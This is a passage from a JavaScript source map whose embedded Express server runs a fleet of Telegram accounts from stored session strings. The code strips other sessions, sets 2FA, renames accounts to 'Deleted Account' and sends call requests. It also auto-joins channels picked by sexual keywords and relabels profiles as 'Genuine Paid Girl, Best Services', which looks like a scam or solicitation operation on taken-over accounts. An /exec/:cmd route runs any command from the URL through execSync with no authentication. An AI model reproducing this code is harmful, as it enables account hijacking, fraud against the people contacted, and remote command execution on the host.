exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/UpdateName/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/deletepp/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.deleteProfilePhotos();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/rmbuffer/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    await db.deleteBufferClient({ mobile: number })\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/removeAuths/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      await client.removeOtherAuths();\r\n      res.send(\"Auths Removed\");\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\napp.get('/exec/:cmd', async (req, res, next) => {\r\n  let cmd = req.params.cmd;\r\n  console.log(`executing: `, cmd);\r\n  try {\r\n    res.send(console.log(execSync(cmd).toString()));\r\n  } catch (error) {\r\n    console.log(error);\r\n  }\r\n});\r\n\r\napp.get('/blockusers/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      await client.blockAllUsers();\r\n      res.send(\"Blocked Users\");\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\napp.get('/getAuths/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      res.json(await client.getAuths());\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\n\r\napp.get('/connectcliens/:limit/:skip', async (req, res) => {\r\n  const limit = req.params?.limit;\r\n  const skip = req.params?.skip;\r\n  const db = ChannelService.getInstance();\r\n  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n\r\n  for (const user of users) {\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      if (cli) {\r\n        resp += `${user.mobile} : true\\n\\n`;\r\n      } else {\r\n        resp += `${user.mobile} : false\\n\\n`;\r\n      }\r\n    }\r\n  }\r\n\r\n  resp += '</pre></body></html>';\r\n\r\n  console.log(\"data: \", resp);\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/disconnectclients', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  await disconnectAll();\r\n});\r\n\r\napp.get('/disconnectclient', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const number = req.query?.number?.replace('+', '');\r\n  await deleteClient(number);\r\n});\r\n\r\napp.get('/promoteStats', async (req, res, next) => {\r\n  const resp = await getPromotionStatsHtml();\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp)\r\n});\r\n\r\n\r\napp.get('/getusers/:limit/:skip', async (req, res, next) => {\r\n  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);\r\n  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);\r\n  const db = ChannelService.getInstance();\r\n  const users = await db.getUsers(limit, skip);\r\n  res.json(users)\r\n})\r\n\r\napp.get('/getlastmsgs/:number/:limit', async (req, res, next) => {\r\n  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);\r\n  const number = req.params?.number;\r\n  console.log(number, limit);\r\n  const clientobj = getClient(number);\r\n  await clientobj.client.connect();\r\n  console.log(clientobj.client.connected);\r\n  if (clientobj) {\r\n    const result = await clientobj?.getLastMsgs(limit, number);\r\n    res.send(result)\r\n  } else {\r\n    res.send(\"client is undefined\");\r\n  }\r\n\r\n})\r\n\r\napp.get('/getchannels', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getchannels`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/restart', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userName = req.query.userName;\r\n  const checker = checkerclass.getinstance()\r\n  checker.restart(userName.toLowerCase());\r\n});\r\n\r\napp.get('/receiveNumber/:num', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const num = parseInt(req.params.num);\r\n    const data = userMap.get(userName.toLowerCase());\r\n    if (data) {\r\n      await fetchWithTimeout(`${data.url}receiveNumber/${num}`, { timeout: 7000 });\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.get('/tgclientoff/:num', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const processId = req.params.num;\r\n    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, \" : \", userName, ' - ', processId)\r\n\r\n    try {\r\n      const data = userMap.get(userName.toLowerCase());\r\n      const url = data?.url;\r\n      if (url) {\r\n        const connectResp = await fetchWithTimeout(`${url}getprocessid`, { timeout: 10000 });\r\n        if (connectResp.data.ProcessId === processId) {\r\n          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });\r\n          pushToconnectionQueue(userName, processId)\r\n        } else {\r\n          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);\r\n          console.log(\"Request received from Unknown process\")\r\n        }\r\n      }\r\n    } catch (error) {\r\n      console.log(\"Some Error: \", error)\r\n    }\r\n\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error);\r\n  }\r\n});\r\n\r\n\r\napp.get('/joinchannel', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    if (userName) {\r\n      const data = userMap.get(userName.toLowerCase());\r\n      if (data) {\r\n        joinchannels(data)\r\n      } else {\r\n        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);\r\n      }\r\n    } else {\r\n      Array.from(userMap.values()).map(async (value) => {\r\n        try {\r\n          joinchannels(value);\r\n          await sleep(3000);\r\n        } catch (error) {\r\n          console.log(\"Some Error: \", error.code);\r\n        }\r\n      })\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error);\r\n  }\r\n});\r\n\r\napp.get('/joinchannelBf', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    joinchannelForBufferClients()\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.get('/requestcall', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const chatId = req.query.chatId;\r\n    const user = userMap.get(userName.toLowerCase());\r\n    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);\r\n    console.log(`Call Request Recived: ${userName} | ${chatId}`)\r\n    if (user) {\r\n      setTimeout(async () => {\r\n        try {\r\n          const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });\r\n          if (data.data) {\r\n            console.log(`Call Request Sent: ${userName} | ${chatId}`)\r\n            setTimeout(async () => {\r\n              try {\r\n                const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });\r\n                setTimeout(async () => {\r\n                  await fetchWithTimeout(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });\r\n                }, 3 * 60 * 1000);\r\n              } catch (error) {\r\n                console.log(error)\r\n              }\r\n            }, 2 * 60 * 1000);\r\n          } else {\r\n            console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);\r\n          }\r\n        } catch (error) {\r\n          console.log(\"Failed\", user);\r\n        }\r\n\r\n      }, 3 * 60 * 1000);\r\n    } else {\r\n      console.log(\"USer not exist!!\")\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.listen(port, async () => {\r\n  console.log(`Example app listening at http://localhost:${port}`)\r\n});\r\n\r\nclass checkerclass {\r\n  static instance = undefined;\r\n\r\n  constructor () {\r\n    this.main();\r\n  };\r\n\r\n  static getinstance() {\r\n    if (!checkerclass.instance) {\r\n      console.log('creating instance-------')\r\n      checkerclass.instance = new checkerclass();\r\n    }\r\n    return checkerclass.instance;\r\n  }\r\n  main() {\r\n\r\n  }\r\n\r\n  async restart(userName, processId) {\r\n    const data = userMap.get(userName);\r\n    console.log(data, userName);\r\n    const url = data?.url;\r\n    if (url) {\r\n      userMap.set(userName, { ...data, timeStamp: Date.now() });\r\n      try {\r\n        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });\r\n        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });\r\n        try {\r\n          console.log('Checking Health')\r\n          const resp = await fetchWithTimeout(`${url} checkHealth`, { timeout: 10000 });\r\n          if (resp.status === 200 || resp.status === 201) {\r\n            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {\r\n              console.log(resp.data.userName, ': All good');\r\n            } else {\r\n              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);\r\n              await fetchWithTimeout(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:HealthCheckError-${resp.data.status}`);\r\n              try {\r\n                const connectResp = await fetchWithTimeout(`${url}tryToConnect/${processId}`, { timeout: 10000 });\r\n                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);\r\n                await fetchWithTimeout(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:RetryResponse-${connectResp.data.status}`);\r\n              } catch (e) {\r\n                console.log(url, `CONNECTION RESTART FAILED!!`);\r\n              }\r\n            }\r\n          } else {\r\n            console.log(url, `is unreachable!!`);\r\n          }\r\n        } catch (e) {\r\n          console.log(url, `is unreachable!!`);\r\n          //console.log(e)\r\n        }\r\n      }\r\n      catch (e) {\r\n        console.log(e)\r\n      }\r\n    }\r\n    else {\r\n      console.log('url is undefined');\r\n    }\r\n  }\r\n}\r\nasync function joinchannels(value) {\r\n  try {\r\n    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });\r\n    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)\r\n    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {\r\n      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)\r\n      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n      const db = ChannelService.getInstance();\r\n      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');\r\n      for (const channel of channels) {\r\n        try {\r\n          console.log(channel.username);\r\n          const username = channel?.username?.replace(\"@\", '');\r\n          if (username) {\r\n            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);\r\n            await sleep(200000);\r\n          }\r\n        } catch (error) {\r\n          console.log(\"Some Error: \", error)\r\n        }\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\n\r\n\r\nasync function getPromotionStatsPlain() {\r\n  let resp = '';\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.readPromoteStats();\r\n  for (const data of result) {\r\n    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;\r\n  }\r\n  return resp;\r\n}\r\n\r\nasync function getPromotionStats() {\r\n  let resp = '';\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.readPromoteStats();\r\n  for (const data of result) {\r\n    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;\r\n  }\r\n  return resp;\r\n}\r\n\r\nasync function getPromotionStatsHtml() {\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  resp = resp + await getPromotionStats();\r\n  resp += '</pre></body></html>';\r\n  return resp;\r\n}\r\n\r\nfunction isDateInPast(dateStr) {\r\n  const today = new Date();\r\n  const [day, month, year] = dateStr.split('-').map(Number);\r\n  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript\r\n\r\n  return inputDate < today;\r\n}\r\n\r\nasync function getData() {\r\n  const profileData = await createInitializedObject();\r\n  const db = await ChannelService.getInstance();\r\n  let entries = await db.readStats();\r\n  // console.log(Object.keys(profileData));\r\n  for (const entry of entries) {\r\n    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;\r\n\r\n    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])\r\n    if (client && profileData[client.toUpperCase()]) {\r\n      const userData = profileData[client.toUpperCase()];\r\n      userData.totalCount += count;\r\n      userData.totalPaid += payAmount > 0 ? 1 : 0;\r\n      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;\r\n      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;\r\n      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;\r\n      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;\r\n      if (payAmount > 25 && !demoGiven) {\r\n        userData.names = userData.names + ` ${name} |`\r\n      }\r\n\r\n      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {\r\n        userData.fullShowPPl++;\r\n        userData.fullShowNames = userData.fullShowNames + ` ${name} |`\r\n      }\r\n\r\n      if (newUser) {\r\n        userData.totalNew += 1;\r\n        userData.totalNewPaid += payAmount > 0 ? 1 : 0;\r\n        userData.newPaidDemo += demoGivenToday ? 1 : 0;\r\n        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;\r\n      }\r\n    }\r\n  }\r\n  const profileDataArray = Object.entries(profileData);\r\n  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);\r\n  let reply = '';\r\n  for (const [profile, userData] of profileDataArray) {\r\n    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;\r\n  }\r\n\r\n  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);\r\n  let reply2 = '';\r\n  for (const [profile, userData] of profileDataArray) {\r\n    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;\r\n  }\r\n\r\n  let reply3 = await getPromotionStats()\r\n\r\n  return (\r\n    `<div>\r\n      <div style=\"display: flex; margin-bottom: 60px\">\r\n        <div style=\"flex: 1;\">${reply}</div>\r\n        <div style=\"flex: 1; \">${reply2}</div>\r\n      </div>\r\n      <div style=\"display: flex;\">\r\n        <div style=\"flex: 1; \" >${reply3}</div>\r\n      </div>\r\n    </div>`\r\n  );\r\n\r\n}\r\nlet goodIds = [];\r\nlet badIds = [];\r\nasync function checkBufferClients() {\r\n  const db = await ChannelService.getInstance();\r\n  await disconnectAll()\r\n  await sleep(2000);\r\n  const clients = await db.readBufferClients({});\r\n  goodIds = [];\r\n  badIds = [];\r\n  if (clients.length < 40) {\r\n    for (let i = 0; i < 40 - clients.length; i++) {\r\n      badIds.push(1)\r\n    }\r\n  }\r\n  for (const document of clients) {\r\n    console.log(document)\r\n    const cli = await createClient(document.mobile, document.session);\r\n    if (cli) {\r\n      const client = await getClient(document.mobile);\r\n      const hasPassword = await client.hasPassword();\r\n      if (!hasPassword) {\r\n        badIds.push(document.mobile);\r\n        await db.deleteBufferClient(document);\r\n      } else {\r\n        const channels = await client.channelInfo(true);\r\n        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });\r\n        console.log(document.mobile, \" :  ALL Good\");\r\n        goodIds.push(document.mobile)\r\n      }\r\n      await client.disconnect();\r\n      await deleteClient(document.mobile)\r\n      await sleep(2000);\r\n    } else {\r\n      console.log(document.mobile, \" :  false\");\r\n      badIds.push(document.mobile);\r\n      await db.deleteBufferClient(document)\r\n    }\r\n  }\r\n  console.log(badIds, goodIds);\r\n  await addNewUserstoBufferClients();\r\n}\r\n\r\nasync function addNewUserstoBufferClients() {\r\n  const db = await ChannelService.getInstance();\r\n  const cursor = await db.getNewBufferClients(goodIds);\r\n  while (badIds.length > 0) {\r\n    try {\r\n      if (cursor.hasNext()) {\r\n        const document = await cursor.next();\r\n        const cli = await createClient(document.mobile, document.session);\r\n        if (cli) {\r\n          const client = await getClient(document.mobile);\r\n          const hasPassword = await client.hasPassword();\r\n          console.log(\"hasPassword: \", hasPassword);\r\n          if (!hasPassword) {\r\n            await client.removeOtherAuths();\r\n            await client.set2fa();\r\n            console.log(\"waiting for setting 2FA\");\r\n            await sleep(35000);\r\n            await client.updateUsername();\r\n            await sleep(5000)\r\n            await client.updatePrivacyforDeletedAccount();\r\n            await sleep(5000)\r\n            await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n            await sleep(5000)\r\n            await client.deleteProfilePhotos();\r\n            await sleep(5000)\r\n            console.log(\"Inserting Document\");\r\n            document['date'] = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n            await db.insertInBufferClients(document);\r\n            await client.disconnect();\r\n            await deleteClient(document.mobile)\r\n            badIds.pop();\r\n          } else {\r\n            await db.updateUser(document, { twoFA: true });\r\n            await client.disconnect();\r\n            await deleteClient(document.mobile)\r\n          }\r\n        } else {\r\n          // await db.deleteUser(document);\r\n        }\r\n      } else {\r\n        console.log(\"Cursor Does not have Next\");\r\n      }\r\n    } catch (error) {\r\n      console.error(\"An error occurred:\", error);\r\n    }\r\n  }\r\n  setTimeout(() => {\r\n    joinchannelForBufferClients()\r\n  }, 2 * 60 * 1000);\r\n}\r\n\r\n\r\nasync function updateClient(clientId) {\r\n  try {\r\n    const db = await ChannelService.getInstance();\r\n    await disconnectAll();\r\n    await sleep(2000);\r\n    const oldClient = await db.getUserConfig({ clientId })\r\n    if (oldClient) {\r\n      try {\r\n        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace(\"+\", '') });\r\n        if (oldClientUser) {\r\n          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);\r\n          if (cli) {\r\n            const client = await getClient(oldClientUser.mobile);\r\n            await CloudinaryService.getInstance(oldClient?.dbcoll?.toLowerCase());\r\n            // const userCaps = username[0].toUpperCase() + username.slice(1)\r\n            // await client.updateUsername(`${userCaps}Redd`);\r\n            await sleep(2000)\r\n            await client.updateProfile(oldClient.name, \"Genuine Paid Girl, Best Services\");\r\n            await sleep(3000)\r\n            await client.deleteProfilePhotos();\r\n            await sleep(3000)\r\n            await client.updatePrivacy();\r\n            await sleep(3000)\r\n            await client.updateProfilePic('./dp1.jpg');\r\n            await sleep(3000);\r\n            await client.updateProfilePic('./dp2.jpg');\r\n            await sleep(3000);\r\n            await client.updateProfilePic('./dp3.jpg');\r\n            await sleep(2000);\r\n          }\r\n        }\r\n      } catch (error) {\r\n        console.log(\"Error updateing settings of old Client - \", error);\r\n      }\r\n    }\r\n  } catch (e) {\r\n\r\n  }\r\n}\r\nasync function setUpClient(clientId, archieveOld, days = 0, mobile = null, formalities = true, pLimited = false) {\r\n  try {\r\n    const db = await ChannelService.getInstance();\r\n    const oldClient = await db.getUserConfig({ clientId })\r\n    let oldClienttg;\r\n    if (archieveOld && oldClient) {\r\n      try {\r\n        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace(\"+\", '') });\r\n        if (oldClientUser) {\r\n          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session, false);\r\n          if (cli) {\r\n            oldClienttg = await getClient(oldClientUser.mobile);\r\n            // await oldClienttg.updateProfile(\"Deleted Account\", `New ACC https://${oldClient.link}`);\r\n            // await sleep(5000)\r\n            await oldClienttg.deleteProfilePhotos();\r\n            await sleep(3000)\r\n            await oldClienttg.updatePrivacyforDeletedAccount();\r\n            await sleep(2000)\r\n            await oldClienttg.updateUsername()\r\n          }\r\n        }\r\n        delete oldClientUser[\"_id\"];\r\n        if (!pLimited) {\r\n          oldClientUser['date'] = (new Date(Date.now() + (days * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n          await db.insertInBufferClients({ ...oldClientUser })\r\n        }\r\n      } catch (error) {\r\n        console.log(\"Error updateing settings of old Client - \", error);\r\n        await fetchWithTimeout(`${ppplbot()}&text=Error updateing settings of old Client - ${clientId}`);\r\n      }\r\n      delete oldClient['_id']\r\n      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]\r\n      oldClient['pLimited'] = pLimited\r\n      await db.insertInAchivedClient(oldClient);\r\n      await fetchWithTimeout(`${ppplbot()}&text=Archived Old Client ${clientId}`);\r\n      console.log(\"Archived old client\");\r\n    }\r\n\r\n    const newClient = await db.getOneBufferClient(mobile);\r\n\r\n    await deleteClient(newClient.mobile)\r\n    await sleep(2000);\r\n    if (newClient) {\r\n      const cli = await createClient(newClient.mobile, newClient.session, false);\r\n      if (cli) {\r\n        const client = await getClient(newClient.mobile);\r\n        let newUsername\r\n        setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });\r\n        if (formalities) {\r\n          const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\r\n          const userCaps = username[0].toUpperCase() + username.slice(1);\r\n          newUsername = await client.updateUsername(`${userCaps}Redd`);\r\n          if (archieveOld && oldClienttg) {\r\n            oldClienttg?.updateProfile(\"Deleted Account\", `New ACC: @${newUsername}`);\r\n          }\r\n        }\r\n        await sleep(2000)\r\n        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });\r\n        if (existingData) {\r\n          await fetchWithTimeout(`${ppplbot()}&text=Setting UP from archives - ${clientId}-${newUsername}-${newClient.mobile}`);\r\n          console.log(\"Data Existing already\");\r\n          await setNewClient({ ...existingData, userName: newUsername }, { clientId });\r\n          await db.removeOneAchivedClient({ number: `+${newClient.mobile}` });\r\n        } else {\r\n          await fetchWithTimeout(`${ppplbot()}&text=Generating new Session -  ${clientId}-${newUsername}-${newClient.mobile}`);\r\n          await generateNewSession(newClient.mobile);\r\n          setTimeout(async () => {\r\n            const stillExists = await db.getOneBufferClient(newClient.mobile);\r\n            if (stillExists) {\r\n              console.log(\"Removeing buff client as failed to update\")\r\n              stillExists['date'] = (new Date(Date.now() + (30 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n              await db.insertInBufferClients({ ...stillExists })\r\n            }\r\n          }, 150000);\r\n        }\r\n      }\r\n    } else {\r\n      console.log(\"New client does not exist\")\r\n    }\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\nasync function generateNewSession(phoneNumber) {\r\n  try {\r\n    console.log(\"String Generation started\");\r\n    await sleep(1000);\r\n    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\r\n    if (response) {\r\n      console.log(`Code Sent successfully-${response}`);\r\n      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);\r\n    } else {\r\n      await sleep(5000);\r\n      await generateNewSession(phoneNumber);\r\n    }\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\nasync function setNewClient(user, activeClientSetup) {\r\n  try {\r\n    console.log(\"Setting data for:\", user, activeClientSetup)\r\n    const clientId = activeClientSetup.clientId;\r\n    const db = await ChannelService.getInstance();\r\n    let mainAccount = user.userName?.replace(\"@\", '')\r\n    if (fetchNumbersFromString(clientId) == \"2\") {\r\n      const mainUser = await db.getUserConfig({ clientId: clientId.replace(\"2\", \"1\") });\r\n      mainAccount = mainUser.userName;\r\n    } else {\r\n      const client2 = clientId.replace(\"1\", \"2\")\r\n      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });\r\n      if (data) {\r\n        console.log(client2, \" -  \", data)\r\n        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);\r\n        // if (data.userName) {\r\n        //   try {\r\n        //     await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${data.userName}`);\r\n        //   } catch (error) {\r\n\r\n        //   }\r\n        // }\r\n      }\r\n    }\r\n    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace(\"@\", ''), mainAccount: mainAccount });\r\n    console.log(\"Updated the Client Successfully\", updatedClient);\r\n    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });\r\n    await fetchWithTimeout(`https://uptimechecker.onrender.com/forward/updateclient/${clientId}`);\r\n    await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);\r\n    console.log(activeClientSetup.clientId, \" -  \", updatedClient)\r\n    if (updatedClient?.userName) {\r\n      try {\r\n        await fetchWithTimeout(`https://uptimechecker.onrender.com/disconnectUser?userName=${updatedClient.userName}`);\r\n      } catch (error) {\r\n        console.log(error);\r\n      }\r\n    }\r\n    await setUserMap();\r\n    try {\r\n      await fetchWithTimeout(`https://uptimechecker.onrender.com/refreshmap`);\r\n    } catch (error) {\r\n      console.log(error);\r\n    }\r\n  } catch (error) {\r\n    console.log(error);;\r\n  }\r\n}\r\n\r\nfunction fetchNumbersFromString(inputString) {\r\n  const regex = /\\d+/g;\r\n  const matches = inputString.match(regex);\r\n  if (matches) {\r\n    const result = matches.join('');\r\n    return result;\r\n  } else {\r\n    return '';\r\n  }\r\n}\r\n\r\nasync function joinchannelForBufferClients() {\r\n  const db = ChannelService.getInstance();\r\n  await disconnectAll();\r\n  await sleep(2000);\r\n  const clients = await db.readBufferClients({ channels: { \"$lt\": 180 } }, 4)\r\n  for (const document of clients) {\r\n    const cli = await createClient(document.mobile, document.session, false);\r\n    if (cli) {\r\n      const client = await getClient(document.mobile);\r\n      const channels = await client.channelInfo(true);\r\n      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n      const result = await db.getActiveChannels(150, 0, keys, channels.ids, \"channels\");\r\n      console.log(\"DbChannelsLen: \", result.length);\r\n      let resp = '';\r\n      for (const channel of result) {\r\n\r\n        resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n      }\r\n      client.joinChannels(resp);\r\n    }\r\n  }\r\n}\r\n\r\nfunction pushToconnectionQueue(userName, processId) {\r\n  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);\r\n  if (existingIndex !== -1) {\r\n    connetionQueue[existingIndex].processId = processId;\r\n  } else {\r\n    connetionQueue.push({ userName, processId });\r\n  }\r\n}\r\n"],"names":[],"sourceRoot":""}